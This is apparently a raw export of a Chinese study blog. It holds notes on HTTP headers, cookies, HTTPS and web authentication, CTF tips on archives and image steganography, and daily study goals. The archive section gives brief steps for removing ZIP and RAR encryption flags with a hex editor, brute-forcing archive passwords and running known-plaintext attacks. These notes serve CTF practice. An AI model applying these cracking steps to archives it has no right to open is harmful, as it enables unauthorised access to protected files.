<p>但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字 段 Expires，会<strong>优先处理 max-age</strong> 指令。 </p>
<h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个 值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进 行动态数据处理时，该值有可能会变成数据最终修改时的时间</p>
<h3 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h3><p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的 状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接 着当用户访问该Web网站时，可通过通信方式取回之前发放的 Cookie。 </p>
<p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路 径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他 Web 站点和攻击者的攻击而泄露。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/100.png" alt="100"></p>
<h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。</p>
<blockquote>
<p>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31</p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/101.png" alt="101"></p>
<h5 id="domain-属性"><a href="#domain-属性" class="headerlink" title="domain 属性"></a>domain 属性</h5><p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比 如，当指定 example.com 后，除 example.com 以外，<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 或 www2.example.com 等都可以发送 Cookie。 </p>
<p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定 domain 属性显得更安全。 </p>
<h5 id="secure-属性"><a href="#secure-属性" class="headerlink" title="secure 属性"></a>secure 属性</h5><p>发送 Cookie 时，指定 secure 属性的方法如下所示。</p>
<blockquote>
<p>Set-Cookie: name=value; secure</p>
</blockquote>
<h5 id="HttpOnly-属性"><a href="#HttpOnly-属性" class="headerlink" title="HttpOnly 属性"></a>HttpOnly 属性</h5><p>发送指定 HttpOnly 属性的 Cookie 的方法如下所示。</p>
<blockquote>
<p>Set-Cookie: name=value; HttpOnly</p>
</blockquote>
<p>通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。 但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后 的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持 Cookie 了。 </p>
<h5 id="expires-属性"><a href="#expires-属性" class="headerlink" title="expires 属性"></a>expires 属性</h5><p>一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可 以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对 客户端 Cookie 的实质性删除操作。 </p>
<h5 id="path-属性"><a href="#path-属性" class="headerlink" title="path 属性"></a>path 属性</h5><p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。 不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱 有期待。</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支 持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个 Cookie 时，同样可以以多个 Cookie 形式发送。 </p>
<blockquote>
<p>Cookie: status=enable</p>
</blockquote>
<h3 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h3><p>HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应 用上，会出现各种非标准的首部字段。</p>
<h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容 在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防 止点击劫持（clickjacking）攻击。</p>
<p>首部字段 X-Frame-Options 有以下两个可指定的字段值。 </p>
<ol>
<li>DENY ：拒绝 </li>
<li>SAMEORIGIN ：仅同源域名下的页面（Top-level-browsingcontext）匹配时许可。（比如，当指定 <a href="http://hackr.jp/sample.html" target="_blank" rel="noopener">http://hackr.jp/sample.html</a> 页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被 允许可加载该页面，而 example.com 等其他域名的页面就不行 了）</li>
</ol>
<p>对 apache2.conf 的配置实例</p>
<blockquote>
<IfModule mod_headers.c>

<p>Header append X-FRAME-OPTIONS “SAMEORIGIN” </p>
</IfModule>
</blockquote>
<h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本 攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。 </p>
<p>首部字段 X-XSS-Protection 可指定的字段值如下。 </p>
<ol>
<li>0 ：将 XSS 过滤设置成无效状态 </li>
<li>1 ：将 XSS 过滤设置成有效状态 </li>
</ol>
<h4 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h4><p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简 称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>
<p>首部字段 DNT 可指定的字段值如下。</p>
<ol>
<li>0 ：同意被追踪 </li>
<li>1 ：拒绝被追踪 </li>
</ol>
<h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上 的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的 目的。、</p>
<blockquote>
<p>P3P: CP=”CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</p>
</blockquote>
<p>要进行 P3P 的设定，需按以下操作步骤进行。 </p>
<ol>
<li>步骤 1：创建 P3P 隐私 </li>
<li>步骤 2：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml </li>
<li>步骤 3：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中</li>
</ol>
<blockquote>
<p>P3P详情：<a href="https://www.w3.org/TR/P3P/" target="_blank" rel="noopener">https://www.w3.org/TR/P3P/</a></p>
</blockquote>
<h2 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+ 加密 + 认证 + 完整性保护 =HTTPS"></a>HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</h2><h3 id="HTTPS-采用混合加密机制"><a href="#HTTPS-采用混合加密机制" class="headerlink" title="HTTPS 采用混合加密机制"></a>HTTPS 采用混合加密机制</h3><h4 id="共享密钥加密的困境"><a href="#共享密钥加密的困境" class="headerlink" title="共享密钥加密的困境"></a>共享密钥加密的困境</h4><p>加密和解密同用一个密钥的方式称为共享密钥加密（Common key crypto system），也被叫做对称密钥加密。</p>
<p>以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能 安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥 就可会落入攻击者之手，同时也就失去了加密的意义。另外还得 设法安全地保管接收到的密钥</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/105.png" alt="105"></p>
<h4 id="公开密钥加密方式解决了共享密钥加密的困难"><a href="#公开密钥加密方式解决了共享密钥加密的困难" class="headerlink" title="公开密钥加密方式解决了共享密钥加密的困难"></a>公开密钥加密方式解决了共享密钥加密的困难</h4><p>公开密钥加密使用一对非对称的密钥。一把叫做私有密钥 （private key），另一把叫做公开密钥（public key）。顾名思 义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。</p>
<p>使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进 行加密处理，对方收到被加密的信息后，再使用自己的私有密钥 进行解密。利用这种方式，不需要发送用来解密的私有密钥，也 不必担心密钥被攻击者窃听而盗走。</p>
<p>另外，要想根据密文和公开密钥，恢复到信息原文是异常困难 的，因为解密过程就是在对离散对数进行求值，这并非轻而易举 就能办到。退一步讲，如果能对一个非常大的整数做到快速地因 式分解，那么密码破解还是存在希望的。但就目前的技术来看是 不太现实的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/106.png" alt="106"></p>
<h4 id="HTTPS-采用混合加密机制-1"><a href="#HTTPS-采用混合加密机制-1" class="headerlink" title="HTTPS 采用混合加密机制"></a>HTTPS 采用混合加密机制</h4><p>HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处 理速度要慢。</p>
<p>所以应充分利用两者各自的优势，将多种方法组合起来用于通 信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。</p>
<h2 id="确认访问用户身份的认证"><a href="#确认访问用户身份的认证" class="headerlink" title="确认访问用户身份的认证"></a>确认访问用户身份的认证</h2><h3 id="BASIC-认证"><a href="#BASIC-认证" class="headerlink" title="BASIC 认证"></a>BASIC 认证</h3><ol>
<li>步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。 该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 （realm）。 </li>
<li>步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将 用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码 构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。 假设用户 ID 为 guest，密码是 guest，连接起来就会形成 guest:guest 这 样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后， 发送请求。<br>当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后， 浏览器会自动完成到 Base64 编码的转换工作。</li>
<li>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证 信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。</li>
</ol>
<p><strong>缺点：</strong></p>
<p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要 任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID 和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程 中，如果被人窃听，被盗的可能性极高。</p>
<p>另外，除此之外想再进行一次 BASIC 认证时，一般的浏览器却<strong>无法实现认证注销操作</strong>，这也是问题之一。</p>
<p>BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安 全性等级，因此它并不常用。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/102.png" alt="102"></p>
<h3 id="DIGEST-认证"><a href="#DIGEST-认证" class="headerlink" title="DIGEST 认证"></a>DIGEST 认证</h3><ol>
<li>步骤 1： 请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返 回带 WWW-Authenticate 首部字段的响应。 该字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）。<br>首部字段 WWW-Authenticate 内必须包含 realm 和 nonce 这两个字段的 信息。客户端就是依靠向服务器回送这两个值进行认证的。<br>nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符 串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依 赖服务器的具体实现。</li>
<li>步骤 2： 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认 证必须的首部字段 Authorization 信息。 首部字段 Authorization 内必须包含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce 就是之前从服务器接收到 的响应中的字段。<br>username 是 realm 限定范围内可进行认证的用户名。 uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。<br>response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符 串，形成响应码。<br>响应中其他的实体请参见第 6 章的请求首部字段 Authorization。另 外，有关 Request-Digest 的计算规则较复杂，有兴趣的读者不妨深入 学习一下 RFC2617。 </li>
<li>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会确认认 证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。 并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。</li>
</ol>
<p><strong>缺点：</strong></p>
<p>DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的 客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p>
<p>DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不 到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也 有所受限</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/103.png" alt="103"></p>
<h3 id="SSl客户端认证"><a href="#SSl客户端认证" class="headerlink" title="SSl客户端认证"></a>SSl客户端认证</h3><p>如果用户的ID和密码被盗，则很可能被冒充。</p>
<p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问<strong>是否来自已登录的客户端</strong>。</p>
<p>为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户 端，且客户端必须安装此证书。</p>
<ol>
<li>步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。 </li>
<li>步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信 息以 Client Certificate 报文方式发送给服务器。<br>图：选择客户端证书示例（三菱东京 UFJ 银行） </li>
<li>步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</li>
</ol>
<blockquote>
<p>在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和 基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。所谓双因素认证就是指，认证过程中不仅需 要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为 另一个因素，与其组合使用的认证方式。</p>
<p>换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p>
<p>通过双因素认证后，就可以确认是<strong>用户本人</strong>正在使用<strong>匹配正确的计算机</strong>访问服务器。</p>
</blockquote>
<p>注：SSL客户端认证需要支付费用</p>
<h3 id="基于表单认证"><a href="#基于表单认证" class="headerlink" title="基于表单认证"></a>基于表单认证</h3><p>基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向<strong>服务器上的 Web 应用程序</strong>发送登录信息（Credential），按登录信息的验 证结果认证。</p>
<p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话）。 </p>
<ol>
<li>步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。 </li>
<li>步骤 2： 服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。 向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID（如 PHPSESSID=028a8c…）。 你可以把 Session ID 想象成一种用以区分不同用户的等位号。<br>然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进 行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到 这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行 有效期的管理，保证其安全性。<br>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie 内加上 <strong>httponly</strong> 属性。</li>
<li>步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证 接收到的 Session ID 识别用户和其认证状态。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/104.png" alt="104"></p>
<p>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法， 服务器端应如何保存用户提交的密码等登录信息等也没有标准化。 </p>
<p>通常，一种安全的保存方法是，先利用给密码加盐（salt）1 的方式增 加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我 们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码 泄露的风险。</p>
<blockquote>
<p>1 salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是 真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当 两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将 是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手 中的密码特征库进行破解。</p>
</blockquote>
<h2 id="基于HTTP协议追加的协议"><a href="#基于HTTP协议追加的协议" class="headerlink" title="基于HTTP协议追加的协议"></a>基于HTTP协议追加的协议</h2><h3 id="消除-HTTP-瓶颈的-SPDY"><a href="#消除-HTTP-瓶颈的-SPDY" class="headerlink" title="消除 HTTP 瓶颈的 SPDY"></a>消除 HTTP 瓶颈的 SPDY</h3><h4 id="原本的HTTP协议"><a href="#原本的HTTP协议" class="headerlink" title="原本的HTTP协议"></a>原本的HTTP协议</h4><p>若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶 颈。</p>
<ol>
<li>一条连接上只可发送一个请求。</li>
<li>请求只能从客户端开始。客户端不可以接收除响应以外的指 令。</li>
<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>
<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较 多。</li>
<li>可任意选择数据压缩格式。非强制压缩发送。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/107.png" alt="107"></p>
<h4 id="Ajax-的解决方法"><a href="#Ajax-的解决方法" class="headerlink" title="Ajax 的解决方法"></a>Ajax 的解决方法</h4><p>Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已 加载完毕的 Web 页面上发起请求，<strong>只更新局部页面</strong>。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/108.png" alt="108"></p>
<h4 id="Comet-的解决方法"><a href="#Comet-的解决方法" class="headerlink" title="Comet 的解决方法"></a>Comet 的解决方法</h4><p>通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为 了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内 容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即 反馈给客户端。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/109.png" alt="109"></p>
<h4 id="SPDY-的设计与功能"><a href="#SPDY-的设计与功能" class="headerlink" title="SPDY 的设计与功能"></a>SPDY 的设计与功能</h4><p>SPDY 以<strong>会话层</strong>的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/110.png" alt="110"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/111.png" alt="111"></p>
<p>使用 SPDY 后，HTTP 协议额外获得以下功能。</p>
<ol>
<li><p>多路复用流<br>通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高。</p>
</li>
<li><p>赋予请求优先级<br>SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。</p>
</li>
<li><p>压缩 HTTP 首部                                                                        </p>
<p>压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和 发送的字节数就更少了。</p>
</li>
<li><p>推送功能<br>支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送 数据，而不必等待客户端的请求。</p>
</li>
<li><p>服务器提示功能<br>服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求。</p>
</li>
</ol>
<h3 id="WebSocket-协议"><a href="#WebSocket-协议" class="headerlink" title="WebSocket 协议"></a>WebSocket 协议</h3><p>下面我们列举一下 WebSocket 协议的主要特点。</p>
<p>推送功能<br>支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。</p>
<p>减少通信量<br>只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP相 比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息 很小，通信量也相应减少了。<br>为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一 次“握手”（Handshaking）的步骤。 </p>
<blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/114.png" alt="114"></p>
<p>握手步骤：</p>
<ol>
<li>（握手请求）为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字 段，告知服务器通信协议发生改变，以达到握手的目的。<br>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。 Sec-WebSocket-Protocol 字段内记录使用的子协议。 子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/112.png" alt="112"></li>
<li>（握手响应）对于之前的请求，返回状态码 101 Switching Protocols 的响应。Sec-WebSocket-Accept 的字段值是由握手请求中的 SecWebSocket-Key 的字段值生成的。 成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/113.png" alt="113"></li>
<li>（WebSocket API ）JavaScript 可调用“The WebSocket API”（<a href="http://www.w3.org/TR/websockets/，由" target="_blank" rel="noopener">http://www.w3.org/TR/websockets/，由</a> W3C 标准制定）内 提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。<br>以下为调用 WebSocket API，每 50ms 发送一次数据的实例。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/115.png" alt="115"></li>
</ol>
</blockquote>
<h3 id="Web-服务器管理文件的-WebDAV"><a href="#Web-服务器管理文件的-WebDAV" class="headerlink" title="Web 服务器管理文件的 WebDAV"></a>Web 服务器管理文件的 WebDAV</h3><p>等用到了再回来补充</p>
]]></content>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>文件压缩</title>
    <url>/2020/01/17/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><h3 id="zip文件"><a href="#zip文件" class="headerlink" title="zip文件"></a>zip文件</h3><p>用winhex打开压缩文件，搜索十六进制”50 4B 01 02”，找到从”50”开始的第九第十个字节全部改成”00 00”。</p>
<p><em>（十六进制编译器里每两个数字称为一个字节）</em></p>
<h3 id="rar文件"><a href="#rar文件" class="headerlink" title="rar文件"></a>rar文件</h3><p>用winhex打开十六进制，找到第24个字节，其尾数为0为未加密，为4则为加密。例如将’’84”改为’’80”.</p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="rar文件-1"><a href="#rar文件-1" class="headerlink" title="rar文件"></a>rar文件</h3><p>用ARCHPR暴力破解</p>
<p><strong>小技巧：若知道前三位为abc，则可选择攻击类型为掩码，掩码选择填”abc???”</strong></p>
<h3 id="zip文件-1"><a href="#zip文件-1" class="headerlink" title="zip文件"></a>zip文件</h3><p>用Ziperello暴力破解</p>
<h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><p>明文攻击是指知道加密的zip中部分文件的明文内容，利用这些内容推测出密钥并解密zip文件的攻击方法，相比于暴力破解，这种方法在破解复杂压缩包时效率较高。</p>
<p>例：假设一个加密的压缩包里有两个文件readme.txt和flag.txt，其中flag.txt的内容是答案，而我们拥有readme.txt的明文文件，使用上述两个文件可进行明文攻击。</p>
<p>步骤：</p>
<ol>
<li>将readme.txt的明文文件压缩，变成readme1.zip</li>
<li>打开archpr，攻击类型选明文，明文文件路径选readme1.zip</li>
</ol>
<p><em>注：</em></p>
<ol>
<li>有时跑完得不到指令，但能获得一个提示（加密密钥）。</li>
<li>例如将“1.rar”解压为“1.txt”和“1.png”，要将明文文件“1.txt”压缩，压缩的CRC值和压缩算法要与1.rar一致。</li>
</ol>
<h2 id="压缩包修复"><a href="#压缩包修复" class="headerlink" title="压缩包修复"></a>压缩包修复</h2><p>一个压缩包内可能含有多个文件，而文件头损坏会导致解压不出所以文件，所以</p>
<ol>
<li>找到一个文件的尾部（例如txt的尾部是txt的文本内容）</li>
<li>将下一个文件头第三个字节改为“0x74“</li>
</ol>
<p><img src="/2020/01/17/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9/1.png" alt="1"></p>
]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-14日目标</title>
    <url>/2020/01/14/2020-01-14%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-14目标"><a href="#2020-01-14目标" class="headerlink" title="2020-01-14目标"></a>2020-01-14目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数微分方程</li>
<li>晚上1：00前睡觉</li>
<li>ctf压缩文件</li>
</ol>
<h2 id="2020-01-13总结"><a href="#2020-01-13总结" class="headerlink" title="2020-01-13总结"></a>2020-01-13总结</h2><ol>
<li>晚上复习了高数定积分和不定积分</li>
<li>整理好了图片隐写</li>
<li>安装好了kali虚拟机</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>Y</td>
</tr>
<tr>
<td>早上9：00前起床</td>
<td>N</td>
</tr>
<tr>
<td>高数定积分&amp;&amp;不定积分</td>
<td>Y</td>
</tr>
<tr>
<td>整理图片隐写</td>
<td>Y</td>
</tr>
<tr>
<td>安装好kali虚拟机</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>T</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-13日目标</title>
    <url>/2020/01/13/2020-01-13%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-13目标"><a href="#2020-01-13目标" class="headerlink" title="2020-01-13目标"></a>2020-01-13目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数定积分&amp;&amp;不定积分</li>
<li>整理图片隐写</li>
<li>安装好kali虚拟机</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-12总结"><a href="#2020-01-12总结" class="headerlink" title="2020-01-12总结"></a>2020-01-12总结</h2><ol>
<li>看完了正则表达式第三章</li>
<li>整理了两个JS函数</li>
<li>kali的虚拟机一直安不好。。。明天再试试</li>
<li>b站图片隐写看完，明天整理发博客</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>Y</td>
</tr>
<tr>
<td>早上9：00前起床</td>
<td>N</td>
</tr>
<tr>
<td>高数定积分&amp;&amp;不定积分</td>
<td>N</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>Y</td>
</tr>
<tr>
<td>正则表达式第三章</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>图像的隐写</title>
    <url>/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h2 id="查看gif每一帧"><a href="#查看gif每一帧" class="headerlink" title="查看gif每一帧"></a>查看gif每一帧</h2><ol>
<li>fireworks</li>
<li>photoshop</li>
</ol>
<h2 id="查看exif"><a href="#查看exif" class="headerlink" title="查看exif"></a>查看exif</h2><p>右键属性可查看（有些隐藏信息储存其中）</p>
<h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><ol>
<li><p>有两张几乎相同的图片，利用此软件进行两张图片的加，减，亦或。</p>
<p><em>进行减时两张图片的先后顺序有差别！</em></p>
</li>
<li><p>显示图片的一些颜色通道</p>
</li>
<li><p>data extract调整有关参数获取flag</p>
</li>
</ol>
<h2 id="zsteg（检测LSB隐写）"><a href="#zsteg（检测LSB隐写）" class="headerlink" title="zsteg（检测LSB隐写）"></a>zsteg（检测LSB隐写）</h2><p><em>在linux下运行</em></p>
<p><em>能检测png，jpg格式</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg xxx.png</span><br></pre></td></tr></table></figure>

<h2 id="wbstego4工具"><a href="#wbstego4工具" class="headerlink" title="wbstego4工具"></a>wbstego4工具</h2><p>可检测bmp，rle，txt，asc，html，xml，pdf格式</p>
<h2 id="写python脚本跑"><a href="#写python脚本跑" class="headerlink" title="写python脚本跑"></a>写python脚本跑</h2><p>本人暂时不会</p>
